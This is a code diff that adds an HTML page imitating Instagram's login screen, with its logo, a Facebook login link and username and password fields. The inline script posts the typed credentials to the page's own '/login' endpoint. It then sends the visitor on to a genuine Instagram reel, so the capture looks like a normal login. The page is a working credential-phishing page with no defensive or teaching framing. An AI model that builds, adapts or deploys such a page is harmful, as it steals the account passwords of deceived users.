@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="insta.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+            <div class="phone-image">
+            <img src="phone part.png" alt="Instagram Phone Image">
+            </div>
+    
+        <div class="login-form">
+          <div class="form-box">
+            <h1 class="logo">Instagram</h1>
+    
+            <form action="/login" method="post">
+              <div class="input-box">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+              </div>
+              <div class="input-box">
+                <input type="password" name="password" placeholder="Password" required>
+              </div>
+    
+              <div class="input-box">
+                <button type="submit" class="btn" onclick="redirect()">Log In</button>
+              </div>
+    
+              <div class="separator">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+              </div>
+    
+              <div class="facebook-login">
+                <a href="#" class="fb-link">
+                  <img src="https://img.icons8.com/fluent/48/000000/facebook-new.png" alt="Facebook Logo">
+                  Log in with Facebook
+                </a>
+              </div>
+    
+              <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+          </div>
+    
+          <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+          </div>
+        </div>
+      </div>
+    <script>
+    // JavaScript for handling form submission
+    const form = document.querySelector('form'); // Make sure to select the right form
+    form.addEventListener('submit', async function (event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const formData = new FormData(form);
+        const response = await fetch('/login', {
+            method: 'POST',
+            body: new URLSearchParams(formData)
+        });
+
+        if (response.ok) {
+            // Redirect to Instagram after a successful login
+            window.location.href = 'https://www.instagram.com/reel/DAR0_geJp4V/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=='; // Redirect to Instagram
+        } else {
+            const errorMessage = await response.text();
+            alert('Error: ' + errorMessage); // Show any error message
+        }
+    });
+    </script>
+</body>
+</html>
